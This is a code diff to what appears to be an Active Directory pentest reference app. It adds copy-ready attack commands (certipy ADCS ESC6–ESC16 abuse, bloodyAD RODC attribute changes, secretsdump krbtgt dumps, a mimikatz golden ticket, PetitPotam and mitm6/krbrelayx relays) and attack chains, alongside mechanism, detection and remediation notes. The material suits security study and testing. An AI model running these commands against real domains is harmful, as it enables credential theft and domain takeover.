+    useCase: "Sweeping an entire subnet for DPAPI-protected secrets in a single command instead of running SharpDPAPI/mimikatz triage host-by-host over a lateral movement session.",
   },
   {
     id: "nxc-ldap-gmsa",
@@ -3895,6 +4677,19 @@ const EDGES = [
     steps: ["secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT"],
     impact: "Narrower than full DCSync, but still leaks specific account secrets depending on the filtered set.",
   },
+  {
+    id: "RODCRevealGroupAbuse",
+    name: "Rights on RODC object",
+    target: "RODC Computer Object",
+    category: "acl",
+    grants: "GenericAll/FullControl, GenericWrite, WriteDacl, Owns, or WriteOwner on the RODC's own computer object — any one of these implicitly grants WriteProperty over its msDS-RevealOnDemandGroup and msDS-NeverRevealGroup attributes (WriteOwner via Owns→WriteDacl→WriteProperty; WriteDacl/Owns directly).",
+    steps: [
+      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'",
+      "# If needed, clear msDS-NeverRevealGroup so the target account isn't excluded:",
+      "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-NeverRevealGroup",
+    ],
+    impact: "A targeted Domain Admin account's credentials become eligible for caching on the RODC — combined with admin access to the RODC host itself, this leads to dumping krbtgt_XXXXX and a key-list attack for the DA's actual password hash.",
+  },
 
   // ---------------- Delegation ----------------
   {
@@ -4089,22 +4884,29 @@ const EDGES = [
     name: "ADCS ESC6",
     target: "Certificate Authority",
     category: "adcs",
-    grants: "CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, allowing SAN to be specified at request time on any template.",
-    steps: ["certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -upn administrator@$DOMAIN"],
-    impact: "Turns effectively every enrollable template into ESC1, domain-wide.",
+    grants: "CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set (the 'User Specified SAN' setting), allowing SAN to be specified at request time on any enrollable, authentication-capable template — the default User template already qualifies. Patched environments enforce szOID_NTDS_CA_SECURITY_EXT (KB5014754), which blocks this unless StrongCertificateBindingEnforcement is set to 0.",
+    steps: [
+      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep \"User Specified SAN\"",
+      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'User' -upn administrator@$DOMAIN",
+      "# Or impersonate a computer instead: -template 'Machine' -dns $DC",
+    ],
+    impact: "Turns effectively every enrollable, auth-capable template into ESC1, domain-wide.",
   },
   {
     id: "ADCSESC7",
-    name: "ADCS ESC7",
+    name: "ADCS ESC7 (CA Access Control)",
     target: "Certificate Authority",
-
     category: "adcs",
-    grants: "Manage CA or Manage Certificates rights on the CA object itself.",
+    grants: "ManageCA (\"CA administrator\") or ManageCertificates (\"Certificate Manager\"/Officer) rights on the CA object — two separate exploitation paths depending on which combination you hold and whether CertSvc can be restarted.",
     steps: [
-      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -enable-template 'SubCA'",
-      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'SubCA' -upn administrator@$DOMAIN",
+      "# Path 1 — ManageCA + ability to restart CertSvc: flip the CA into ESC6 directly",
+      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -dc-ip $DC -enable-template 'SubCA'",
+      "# Path 2 — ManageCA only, can't restart CertSvc: abuse the restricted SubCA template via a failed-then-approved request",
+      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'SubCA' -upn administrator@$DOMAIN",
+      "certipy ca -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -dc-ip $DC -issue-request <request-ID-from-above>",
+      "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -retrieve <request-ID-from-above>",
     ],
-    impact: "Re-enable a dangerous template or approve a pending malicious request directly through CA control.",
+    impact: "Path 1 re-enables/exposes a CA-wide ESC6 condition directly. Path 2 needs both ManageCA (to approve) and ManageCertificates (\"Officer\" — grantable via ManageCA) together: SubCA normally rejects standard users with CERTSRV_E_TEMPLATE_DENIED but still issues a request ID, which ManageCA+ManageCertificates can then approve and retrieve despite the denial.",
   },
   {
     id: "ADCSESC8",
@@ -4113,10 +4915,11 @@ const EDGES = [
     category: "adcs",
     grants: "AD CS Web Enrollment (HTTP) is enabled and NTLM relay to it is possible.",
     steps: [
+      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -B20 ESC8",
       "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
       "certipy relay -ca $DC -template DomainController",
     ],
-    impact: "Coerce a machine account (often the DC itself) to authenticate, relay it into a certificate = domain compromise.",
+    impact: "Coerce a machine account (often the DC itself) to authenticate, relay it into a certificate — impersonation is limited to whichever account got coerced, so escalation to admin depends on coercing a privileged one (a DC or Exchange server, not just any machine).",
   },
   {
     id: "ADCSESC9",
@@ -4151,8 +4954,9 @@ const EDGES = [
     name: "ADCS ESC11",
     target: "Certificate Authority (RPC Enrollment)",
     category: "adcs",
-    grants: "The CA's RPC (ICPR) enrollment interface doesn't enforce Extended Protection, so NTLM relay works over RPC even without HTTP web enrollment enabled.",
+    grants: "The CA's RPC (ICPR) enrollment interface doesn't enforce Extended Protection, so NTLM relay works over RPC even without HTTP web enrollment enabled — requires the IF_ENFORCEENCRYPTICERTREQUEST packet-privacy flag to be off, which is not the default.",
     steps: [
+      "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -B20 ESC11",
       "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
       "certipy relay -target 'rpc://$DC' -ca 'CA-NAME'",
     ],
@@ -4163,10 +4967,10 @@ const EDGES = [
     name: "ADCS ESC12",
     target: "Certificate Authority (Private Key)",
     category: "adcs",
-    grants: "The CA's private key material is stored somewhere weakly protected — a Shell PKI object, or an external HSM (e.g. a YubiHSM) left at its default PIN.",
+    grants: "The CA's private key material is stored somewhere weakly protected — a Shell PKI object, or an external HSM (e.g. a YubiHSM2) left at its default PIN. On a YubiHSM-backed CA, the Key Storage Provider's authentication key is stored in cleartext in the registry at HKLM\\SOFTWARE\\Yubico\\YubiHSM\\AuthKeysetPassword, readable by any process regardless of which account it runs as.",
     steps: [
       "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable",
-      "# Flags ESC12 automatically; exploitation is device-specific — recover the key material from the weakly-protected store (e.g. via the HSM's default PIN) and import it as the CA's own key.",
+      "# Flags ESC12 automatically. With shell access to the CA server (even low-privileged), read the AuthKeysetPassword registry value above, then use it to sign a forged ESC1-style certificate directly through the YubiHSM.",
     ],
     impact: "Direct access to the CA's private signing key — see GoldenCert below for what that unlocks.",
   },
@@ -4193,6 +4997,49 @@ const EDGES = [
       "certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject 'CN=administrator,CN=Users,DC=corp,DC=local'",
     ],
     impact: "Forge a valid certificate for any user, entirely offline, bypassing every template restriction — the CA's own key signs it, so nothing about template EKUs or enrollment rights applies.",
+  },
+  {
+    id: "ADCSESC14",
+    name: "ADCS ESC14 (Weak Explicit Mapping)",
+    target: "User/Computer Object (altSecurityIdentities)",
+    category: "adcs",
+    grants: "Write access to a target's altSecurityIdentities attribute (via WriteProperty on it specifically, Write-Property-all, WriteDacl, WriteOwner, GenericWrite/GenericAll, or ownership) lets you point an explicit certificate mapping at a certificate you already hold — no template misconfiguration needed at all, just enrollment on any authentication-capable template as yourself.",
+    steps: [
+      "certipy req -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME' -template 'User' -dc-ip $DC",
+      "certipy cert -pfx user.pfx -nokey -out user.crt",
+      "# Extract Issuer + Serial from user.crt (openssl x509 -in user.crt -noout -text), build 'X509:<I>...<SR>...', then add it to the target's altSecurityIdentities via ldap3/dacledit.py",
+      "certipy auth -pfx user.pfx -domain $DOMAIN",
+    ],
+    impact: "Authenticate as the target account using a certificate you legitimately enrolled for yourself — entirely independent of the target's own template restrictions, since the mapping (not the certificate's identity fields) is what's being abused. ESC14-B/C/D are variants of the same idea targeting an existing weak X509RFC822/X509IssuerSubject/X509SubjectOnly mapping already present on the target instead of writing a new one.",
+  },
+  {
+    id: "ADCSESC15",
+    name: "ADCS ESC15 (EKUwu, CVE-2024-49019)",
+    target: "Certificate Template (Schema v1)",
+    category: "adcs",
+    grants: "A schema version 1 template that allows SAN specification lets a requester embed an arbitrary Application Policy (which Windows treats as higher-priority than EKUs) into the CSR — including Certificate Request Agent — even though the template was never configured to allow it. Patched as CVE-2024-49019.",
+    steps: [
+      "certipy req -u $USER@$DOMAIN --application-policies '1.3.6.1.4.1.311.20.2.1' -ca 'CA-NAME' -template 'SchemaV1Template' -dc-ip $DC",
+      "certipy req -u $USER@$DOMAIN -on-behalf-of '$DOMAIN\\\\Administrator' -template 'User' -ca 'CA-NAME' -pfx cert.pfx -dc-ip $DC",
+      "certipy auth -pfx administrator.pfx -dc-ip $DC",
+    ],
+    impact: "Chains into an ESC3-style Certificate Request Agent certificate, then requests a certificate on behalf of any user — full domain compromise from a schema v1 template that looked harmless. Specifying 'Client Authentication' directly only enables Schannel, not PKINIT, so the Request Agent + on-behalf-of route is the one that actually works end-to-end.",
+  },
+  {
+    id: "ADCSESC16",
+    name: "ADCS ESC16 (CA-Wide Security Extension Disabled)",
+    target: "Certificate Authority (Security Extension)",
+    category: "adcs",
+    grants: "The CA has the szOID_NTDS_CA_SECURITY_EXT extension globally disabled (via policy\\DisableExtensionList) or predates the May 2022 KB5014754 patch — so every certificate it issues lacks the SID-binding extension, making every one of its templates behave like ESC9, domain-wide, regardless of individual template hardening.",
+    steps: [
+      "certipy account -u $USER@$DOMAIN -p $PASS -dc-ip $DC -user 'victim' read",
+      "certipy account -u $USER@$DOMAIN -p $PASS -dc-ip $DC -upn 'administrator' -user 'victim' update",
+      "certipy shadow -u $USER@$DOMAIN -p $PASS -dc-ip $DC -account 'victim' auto",
+      "certipy req -u 'victim@$DOMAIN' -hashes $HASH -ca 'CA-NAME' -template 'User' -upn 'administrator@$DOMAIN' -dc-ip $DC",
+      "certipy account -u $USER@$DOMAIN -p $PASS -dc-ip $DC -upn 'victim@$DOMAIN' -user 'victim' update",
+      "certipy auth -dc-ip $DC -pfx administrator.pfx -username administrator -domain $DOMAIN",
+    ],
+    impact: "A CA-wide disabling turns any single GenericWrite you hold over any account into domain-wide impersonation via UPN manipulation — no direct write access to the target needed at all. Only works under StrongCertificateBindingEnforcement 0/1 (compatibility mode); under full enforcement (2), ESC16 needs pairing with ESC6 to spoof the SID directly in the SAN instead.",
   },
 
   // ---------------- Privileged built-in groups ----------------
@@ -5541,6 +6388,81 @@ const CHAINS = [
       ],
     },
   },
+  {
+    id: "rodc-krbtgt-golden-ticket",
+    title: "RODC Compromise → Own krbtgt → Golden Ticket (RODC-scoped)",
+    category: "credread",
+    summary:
+      "Branch-office RODCs are frequently weaker targets than a hub DC, and each one holds its own dedicated krbtgt account — compromising just that account turns local RODC access into full ticket-forging, without ever touching the domain's real krbtgt.",
+    root: {
+      label: "Local admin / DSRM on a compromised RODC",
+      note: "often the softest target in the environment — physically exposed, less monitored than a hub-site DC",
+      children: [
+        {
+          label: "Dump the RODC's own krbtgt account",
+          command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
+          note: "$TARGETOBJECT = that RODC's krbtgt_<number> account name",
+          children: [
+            {
+              label: "RODC-specific krbtgt NT hash",
+              children: [
+                {
+                  label: "Forge a golden ticket with the RODC's krbtgt",
+                  command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /ptt",
+                  children: [
+                    {
+                      label: "Access via that RODC only",
+                      note: "writable DCs reject the ticket outright — they validate against the domain's real krbtgt, not this one — but the RODC itself, and anything relying on it, honors it",
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "rodc-object-rights-keylist-attack",
+    title: "RODC Object Rights → msDS-RevealOnDemandGroup → Key List Attack → Domain Admin",
+    category: "credread",
+    summary:
+      "Starts from pure ACL control over the RODC's AD object — no host access needed yet — and ends with the actual Domain Admin password hash, not just access scoped to the RODC.",
+    root: {
+      label: "GenericAll / GenericWrite / WriteDacl / Owns / WriteOwner",
+      edgeId: "RODCRevealGroupAbuse",
+      note: "any one of these on the RODC computer object implies WriteProperty over msDS-RevealOnDemandGroup / msDS-NeverRevealGroup",
+      children: [
+        {
+          label: "Add the Domain Admin to msDS-RevealOnDemandGroup",
+          command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object $TARGETOBJECT --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'",
+          note: "clear msDS-NeverRevealGroup first if the target account is listed there — it silently overrides this",
+          children: [
+            {
+              label: "The DA's credentials become eligible for RODC caching",
+              children: [
+                {
+                  label: "Dump the RODC's own krbtgt with host/DSRM admin access",
+                  command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc-user $TARGETOBJECT",
+                  note: "→ see the RODC Compromise → Own krbtgt chain for the golden-ticket path from here",
+                  children: [
+                    {
+                      label: "Conduct a Kerberos key list attack",
+                      note: "abuses the RODC-only KERB-KEY-LIST-REQ PA-DATA type to request the DA's actual long-term key straight from a writable DC, rather than waiting for real credential replication",
+                      children: [
+                        { label: "Domain Administrator's real password hash", note: "→ full domain compromise, not just RODC-scoped access" },
+                      ],
+                    },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
 
   // ---------------- Batch 6: passive poisoning as a relay entry point (no coercion vuln needed) ----------------
   {
@@ -5565,6 +6487,32 @@ const CHAINS = [
                 { label: "Relay to SMB", note: "→ local admin/SYSTEM on any target without SMB signing enforced" },
                 { label: "Relay to LDAP instead", note: "→ see the Coercion → NTLM Relay → LDAP chains for the Shadow Credentials/RBCD payoff — identical relay target, passive entry point" },
                 { label: "Relay to AD CS web enrollment instead", note: "→ see the Coercion → Relay → ADCS ESC8 chain — same certificate payoff, no PetitPotam needed" },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
+  {
+    id: "dns-kerberos-relay-adcs",
+    title: "DNS SOA/TKEY Poisoning → Kerberos Relay → ADCS (ESC8)",
+    category: "adcs",
+    summary:
+      "Where the NTLM relay chain above needs NTLM to be reachable at all, this variant works even when NTLM is disabled domain-wide or the client sits in Protected Users — the whole path runs on Kerberos instead.",
+    root: {
+      label: "mitm6 — poison IPv6 DNS to intercept a dynamic-update SOA/TKEY exchange",
+      command: "mitm6 -i $ATTACKER -d $DOMAIN -hw $TARGET --relay $ADCS_FQDN -v",
+      children: [
+        {
+          label: "Victim Kerberos-authenticates the TKEY request to the attacker",
+          note: "the TKEY exchange requires signing, but that only rules out relaying to LDAP — HTTP and HOST-mapped services are still fair game",
+          children: [
+            {
+              label: "Relay the AP-REQ to ADCS web enrollment",
+              command: "krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER --victim $TARGETOBJECT --adcs --template Machine",
+              children: [
+                { label: "Machine certificate for the coerced/poisoned host", note: "→ same ESC8 payoff as the NTLM relay chain, reachable even when NTLM itself is unavailable" },
               ],
             },
           ],
@@ -5628,6 +6576,26 @@ const LEARN = [
     why: "It requires no valid credential at all — just a username.",
     body: "Kerberos pre-authentication normally requires the client to encrypt a timestamp with its password hash before the KDC issues a TGT, proving the client knows the password. If an account has the 'Do not require Kerberos preauthentication' flag set, the KDC skips that check and returns the AS-REP directly, portions of which are encrypted with the account's password hash — with no proof of identity required first.",
     effect: "The AS-REP is crackable offline exactly like a kerberoast hash, but obtainable with zero prior authentication.",
+  },
+  {
+    id: "printerbug-mechanism",
+    category: "kerberos",
+    title: "PrinterBug (MS-RPRN) — coercion, not code execution",
+    why: "Frequently confused with PrintNightmare, but it's a completely different bug class — a coercion primitive rather than remote code execution — and often still viable when PrintNightmare itself is long patched.",
+    body: "The Print Spooler's MS-RPRN interface exposes RpcRemoteFindFirstPrinterChangeNotification(Ex), meant to let a client register for print-job change notifications from a remote print server. Calling it against a machine with the spooler service running (default on Windows Server, including DCs, unless the service is disabled) makes that machine's own computer account authenticate back to whatever host the notification callback points at — an attacker-controlled listener, if the RPC call is crafted that way. No exploit or memory corruption involved: it's a legitimate RPC feature being used exactly as designed, just pointed somewhere the operator didn't intend.",
+    effect: "A coerced machine-account authentication (usually NTLM, sometimes Kerberos) that's directly relayable — into SMB for local admin/SYSTEM, into ADCS web/RPC enrollment for a certificate (ESC8/ESC11), or into DCSync via LDAP if the coerced account is a domain controller.",
+    detection: "Monitor for RPC calls to the spooler's RpcRemoteFindFirstPrinterChangeNotification(Ex) method from unexpected source hosts, and for the resulting outbound authentication attempts to non-standard destinations.",
+    remediation: "Disable the Print Spooler service on servers and DCs that don't need it (most don't), or apply Microsoft's mitigations restricting spooler remote connections; the underlying fix is preventing the coerced auth from being relayable at all — enforce SMB signing and Extended Protection for Authentication on every service the coercion could be relayed to.",
+  },
+  {
+    id: "printnightmare-mechanism",
+    category: "kerberos",
+    title: "PrintNightmare (CVE-2021-34527/CVE-2021-1675) — spooler RCE, not coercion",
+    why: "The inverse mix-up of PrinterBug: this one really is remote code execution, distinguishing it sharply from the coercion-only PrinterBug despite both living in the same spooler service.",
+    body: "The print spooler's RpcAddPrinterDriver(Ex) RPC call is meant to let an administrator install a printer driver on a print server. A missing access check let a low-privileged, authenticated domain user supply an arbitrary, attacker-controlled driver DLL through this call — the spooler service (running as SYSTEM) loads and executes that DLL immediately, both against a remote target over the network and locally as a privilege-escalation primitive on a single box.",
+    effect: "SYSTEM-level code execution, either remotely against any machine with an exposed, vulnerable spooler service, or locally as a low-priv-to-SYSTEM privilege escalation — full compromise of the target, not just a relayable authentication like PrinterBug.",
+    detection: "Monitor for RpcAddPrinterDriver(Ex) calls installing drivers from unusual paths or unsigned/unexpected publishers, and for new services or DLLs appearing under the spooler's driver directories without a corresponding legitimate print-driver deployment.",
+    remediation: "Apply the July 2021 patches (KB5004945 and follow-ups); where patching isn't immediately possible, disable the Print Spooler service entirely (especially on domain controllers) or restrict driver installation to administrators via Point and Print restrictions.",
   },
   {
     id: "acl-fundamentals",
@@ -5872,10 +6840,20 @@ const LEARN = [
     category: "kerberos",
     title: "Diamond and Sapphire tickets — evading golden-ticket detection",
     why: "Shows how detection logic built around one attack's specific fingerprint gets sidestepped by a variant that avoids that exact fingerprint.",
-    body: "A golden ticket is built entirely offline and never touches a real KDC, which gives it a detectable signature: certain fields (like the ticket's PAC checksum construction, or timestamps) can look subtly different from a KDC-issued ticket if you know what to check for. A diamond ticket instead requests a real TGT from the KDC first — a completely normal, legitimate request — and then modifies specific fields (like group memberships) in that already-issued ticket using the krbtgt hash to re-sign it. A sapphire ticket refines this further, more carefully preserving additional legitimate-looking metadata.",
+    body: "A golden ticket is built entirely offline and never touches a real KDC, which gives it a detectable signature: certain fields (like the ticket's PAC checksum construction, or timestamps) can look subtly different from a KDC-issued ticket if you know what to check for. A diamond ticket instead requests a real TGT from the KDC first — a completely normal, legitimate request — and then modifies specific fields (like group memberships) in that already-issued ticket using the krbtgt hash to re-sign it. A sapphire ticket refines this further by performing an S4U2self round-trip against the KDC to pull a fully legitimate PAC for the target identity before splicing it in, closing PAC-inconsistency gaps a diamond ticket can still leave behind.",
     effect: "Both produce a forged-privilege ticket that's much harder to distinguish from a real one than a classic golden ticket, since it genuinely originated from a real KDC exchange.",
     detection: "Requires comparing PAC contents against what the account's real AD group memberships should be, rather than relying on offline-forgery fingerprints alone — a harder detection problem than golden tickets.",
     remediation: "Same fundamental mitigation as golden tickets — protecting the krbtgt hash is what prevents all ticket-forging variants; rotating krbtgt (twice) invalidates all of them equally.",
+  },
+  {
+    id: "kerberos-relay-mechanism",
+    category: "kerberos",
+    title: "Kerberos relay — why it's harder than NTLM relay, and when it isn't",
+    why: "Kerberos relay looks like NTLM relay's cousin, but the AP-REQ can only be relayed to a service running under the exact identity it was requested for — the whole technique is about forcing that identity to line up with a target worth relaying to.",
+    body: "An AP-REQ (the service-ticket-bearing message a client sends to authenticate) can be relayed exactly like an NTLM auth message, but only if neither side applies session signing or encryption — since the attacker never has the session key needed to fake those. Windows services also only check whether they can decrypt the ticket, not which service class (CIFS, HTTP, HOST...) it was issued for — so one account running several services under different SPN classes means a ticket for one class works against all of them. Because an AP-REQ can't be relayed to a different identity than the one requested, the attacker's real problem is forcing the client to build an AP-REQ for the intended relay target in the first place: via DNS SOA/TKEY poisoning (mitm6 + krbrelayx), a coerced authentication redirected through a spoofed ADIDNS record, or an LLMNR-poisoned answer name (Responder -N) that substitutes an arbitrary relay target's SPN.",
+    effect: "Relaying to LDAP/LDAPS is effectively off the table by default (LDAP always sets up its own signing), which is the single biggest practical difference from NTLM relay — Kerberos relay's real value shows up specifically where NTLM is unavailable (disabled domain-wide) or the client is a member of Protected Users, or the target only accepts Kerberos (a hardened ADCS web enrollment endpoint being the most common real case).",
+    detection: "Watch for DNS SOA/TKEY exchanges and ADIDNS record creation from unexpected sources, unusual Kerberos AP-REQ/AP-REP pairs targeting AD CS or SCCM HTTP endpoints, and LLMNR/mDNS/NBT-NS responses whose answer name doesn't match the original query name.",
+    remediation: "Disable LLMNR/NBT-NS/mDNS where not needed (removes the multicast-poisoning entry point), restrict who can create ADIDNS records, enforce Extended Protection for Authentication on ADCS web enrollment and other HTTP-Kerberos endpoints, and disable IPv6 or deploy mitm6 detections if it isn't in active use.",
   },
   {
     id: "certifried-mechanism",
@@ -5928,6 +6906,16 @@ const LEARN = [
     effect: "Administrator-level compromise of the AD FS server, and potential exposure of the token-signing/encryption keys — which means an attacker doesn't need to steal any individual user's password or defeat MFA at all; they can mint arbitrary trusted authentication tokens for any federated identity, valid across every application trusting that AD FS instance.",
     detection: "AD FS/Admin Event 1132 warns when the DKM container's ACL differs from the secure baseline — the check runs about a minute after the AD FS service starts and every 24 hours after. Review Events 1132 through 1134 on every AD FS server regardless of patch status, since a stolen signing key remains valid until explicitly rotated, meaning patching alone doesn't evict an attacker who got in before the patch.",
     remediation: "Apply the July 2026 cumulative update immediately (this was exploited as a zero-day, so treat any unpatched AD FS server as potentially already compromised, not just theoretically exposed). Review and remediate DKM ACL deviations from the secure baseline — Microsoft's default remediation (disabling inheritance, restricting to Domain Admins/Enterprise Admins/SYSTEM/the AD FS service account only) becomes default behavior starting with the October 2026 updates on Server 2016+, but should be verified manually now rather than waiting. Critically: rotate the token-signing and token-encryption certificates if there's any chance of prior compromise, since patching the ACL doesn't invalidate keys an attacker may have already extracted.",
+  },
+  {
+    id: "cve-2025-58726-2026-26128",
+    category: "cve",
+    title: "CVE-2025-58726 / CVE-2026-26128 — Kerberos reflective relay via Unicode normalization",
+    why: "Extends the NTLM reflective-relay (loopback authentication) bypass chain to Kerberos, by exploiting the fact that two different Windows components normalize Unicode lookalike characters inconsistently with each other.",
+    body: "Registering a DNS record using Unicode lookalike characters (e.g. Ⓡ U+24C7 CIRCLED LATIN CAPITAL LETTER R in place of R, and ․ U+2024 ONE DOT LEADER in place of the dots) creates a hostname that the DC's LDAP search normalizes to the SAME sort key as the real target machine's SPN (via LCMapStringEx with case/width/nonspacing-mark-insensitive flags) — but that the DnsCache service does NOT recognize as loopback/localhost, because CompareStringW there only ignores case, not the other Unicode equivalences. That mismatch lets a coerced machine be tricked into requesting a Kerberos ticket for what it thinks is a distinct remote host, when the DC actually treats it as the same account — producing an AP-REQ relayable back to the originating machine via a modified krbrelayx.",
+    effect: "A reflective (self-to-self) authentication relay entirely via Kerberos — the same class of impact as the earlier NTLM reflective-relay bypasses (SYSTEM-level shells on the coerced machine itself), just reaching it through Kerberos instead of NTLM.",
+    detection: "Monitor for DNS record registrations containing non-ASCII/homoglyph characters in hostnames, and for Kerberos AP-REQ/AP-REP pairs where the requested SPN's hostname doesn't match any legitimately provisioned computer object.",
+    remediation: "The March 2026 patch enforces SMB signing for loopback connections via the RequireSecuritySignatureForLoopback registry key, closing the primary SMB-based path — but services that don't enforce channel binding (ADCS Web Enrollment, SCCM AdminService, MSSQL) remain exposed even post-patch, so treat Extended Protection for Authentication / channel binding as the real fix for those specific services rather than relying on the SMB-focused patch alone.",
   },
 
   // ---------------- Tool source repositories ----------------
@@ -6087,8 +7075,8 @@ const CVES = [
     disclosed: "July 2021",
     summary: "The print spooler's RpcAddPrinterDriver RPC call lets a low-privileged domain account install an attacker-supplied driver DLL, which the spooler loads and runs as SYSTEM — both remotely and locally.",
     relatedTools: ["CVE-2021-1675.py"],
-    learnId: null,
-    seeAlso: { label: "See related commands", query: "PrintNightmare" },
+    learnId: "printnightmare-mechanism",
+    seeAlso: { label: "See related commands + mechanism", query: "PrintNightmare" },
   },
   {
     id: "cve-2021-42287-42278",
@@ -6162,6 +7150,30 @@ const CVES = [
     learnId: "cve-2026-56155",
     seeAlso: { label: "See full writeup, actively exploited", query: "CVE-2026-56155" },
   },
+  {
+    id: "cve-2025-58726-2026-26128",
+    cveId: "CVE-2025-58726 / CVE-2026-26128",
+    title: "Kerberos reflective relay via Unicode normalization",
+    severity: "High",
+    cvss: null,
+    disclosed: "Patched March 2026",
+    summary: "Unicode lookalike characters in a DNS hostname normalize identically for LDAP SPN matching but differently for loopback detection, letting a coerced machine's Kerberos authentication be reflected back to itself — the Kerberos counterpart to earlier NTLM reflective-relay bypasses.",
+    relatedTools: ["krbrelayx.py", "dnstool.py", "PetitPotam.py"],
+    learnId: "cve-2025-58726-2026-26128",
+    seeAlso: { label: "See full writeup", query: "CVE-2025-58726" },
+  },
+  {
+    id: "cve-2024-49019",
+    cveId: "CVE-2024-49019",
+    title: "ADCS ESC15 (EKUwu) — arbitrary application policy",
+    severity: "Critical",
+    cvss: null,
+    disclosed: "Patched November 2024",
+    summary: "Schema version 1 certificate templates that allow SAN specification process a client-suppliable Application Policy extension — which Windows treats as higher priority than EKUs — letting a requester embed Certificate Request Agent or Client Authentication into a certificate the template was never configured to permit.",
+    relatedTools: ["certipy"],
+    learnId: null,
+    seeAlso: { label: "See related commands", query: "ESC15" },
+  },
 ];
 
 function CopyButton({ text, label }) {
@@ -6225,6 +7237,7 @@ function CommandLine({ command, values, shell }) {
 function EntryCard({ entry, values }) {
   const phase = phaseOf(entry.phase);
   const shell = shellOf(entry);
+  const repoUrl = repoFor(entry.tool);
   const variants = getCommandVariants(entry.command).map((v) => ({ ...v, command: applyAuthPreference(v.command, values) }));
   const multi = variants.length > 1;
   const [hover, setHover] = useState(false);
@@ -6249,9 +7262,22 @@ function EntryCard({ entry, values }) {
           <h3 className="text-[15px] leading-snug" style={{ fontFamily: FONT_MONO, fontWeight: 600, color: TEXT_PRIMARY }}>
             {entry.title}
           </h3>
-          <p className="text-xs mt-0.5" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
-            {entry.tool}
-          </p>
+          {repoUrl ? (
+            <a
+              href={repoUrl}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="inline-flex items-center gap-1 text-xs mt-0.5 hover:underline"
+              style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}
+            >
+              <Github size={11} />
+              {entry.tool}
+            </a>
+          ) : (
+            <p className="text-xs mt-0.5" style={{ color: STRUCTURAL, fontFamily: FONT_MONO }}>
+              {entry.tool}
+            </p>
+          )}
         </div>
       </div>
 
